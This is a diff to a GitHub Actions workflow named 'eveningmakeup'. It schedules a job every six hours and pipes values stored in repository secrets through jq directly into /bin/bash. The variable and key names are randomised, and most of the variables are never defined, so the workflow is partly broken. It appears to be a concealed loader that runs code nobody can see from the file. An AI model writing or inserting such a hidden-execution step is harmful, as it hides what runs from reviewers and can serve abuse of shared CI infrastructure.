@@ -1,20 +1,24 @@
 name: eveningmakeup
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 3/6 * * *'
+    - cron: '7 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: eveningmakeup
         env:
-          vwca366: ${{ secrets.vwca366 }}
+          ygprj598: ${{ secrets.ygprj598 }}
         run: |
-          echo $vwca366 | jq -r .awxxg8 | /bin/bash
-          echo $jwcz1 | jq -r .mhw98446 | /bin/bash
-          echo $pbok581 | jq -r .ldfko08 | /bin/bash
-          echo $lxi1624 | jq -r .dwxaj0916 | /bin/bash
-          echo $os5666 | jq -r .zbez407 | /bin/bash
+          echo $ygprj598 | jq -r .pym958 | /bin/bash
+          echo $vgiew16949 | jq -r .jkza3321 | /bin/bash
+          echo $sfhja4836 | jq -r .cjm2039 | /bin/bash
+          echo $hzc47149 | jq -r .ybemi61 | /bin/bash
+          echo $yc317 | jq -r .la240 | /bin/bash
+          echo $ybc18 | jq -r .w7 | /bin/bash
 
